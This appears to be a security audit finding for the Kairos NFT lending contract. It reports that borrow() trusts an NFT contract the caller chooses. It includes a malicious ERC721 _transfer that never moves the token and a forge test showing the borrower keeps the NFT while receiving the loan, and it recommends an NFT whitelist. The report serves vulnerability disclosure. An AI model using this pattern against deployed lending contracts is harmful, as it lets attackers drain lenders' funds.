# Arbitrary external call leads lost funds

## Summary
In borrow function, there is a transferfrom call to arbitrary nft contract. Malicious users can pass a nft address that don't send nft when transfer. But Kairos still transfer money to user.
## Vulnerability Detail

```solidity 
function borrow(BorrowArg[] calldata args) external {
    for (uint256 i = 0; i < args.length; i++) {
        args[i].nft.implem.transferFrom(msg.sender, address(this), args[i].nft.id);
        useCollateral(args[i].args, msg.sender, args[i].nft);
    }
}
```
## Impact
In forge test, I have created a malicious contract that will not make a real transfer in transferFrom.
```solidity
function _transfer(
    address from,
    address to,
    uint256 tokenId
) internal virtual {
    require(ERC721.ownerOf(tokenId) == from, "ERC721: transfer from incorrect owner");
    require(to != address(0), "ERC721: transfer to the zero address");

    _beforeTokenTransfer(from, to, tokenId, 1);
    _afterTokenTransfer(from, to, tokenId, 1);
}
```

Then , in testSimpleBorrow function, I make a borrow with this malicious nft address and do some assert.

```solidity
vm.prank(BORROWER);
kairos.borrow(borrowArgs);

assertEq(nft.balanceOf(BORROWER), 1);
assertEq(money.balanceOf(signer), 0);
assertEq(money.balanceOf(BORROWER), nbOfLoans * getOfferArg().amount);
assertEq(nft.balanceOf(address(kairos)), 0);
for (uint256 i = 0; i < nbOfLoans; i++) {
    assertEq(nft.ownerOf(i + 1), BORROWER);
}
```
And the test pass, we can see that the nft owner is still BORROWER but BORROWER money increases.

## Recommendation
Borrowing and lending using NFTs allowed in the whitelist. And the whitelist should be control in gov contract.
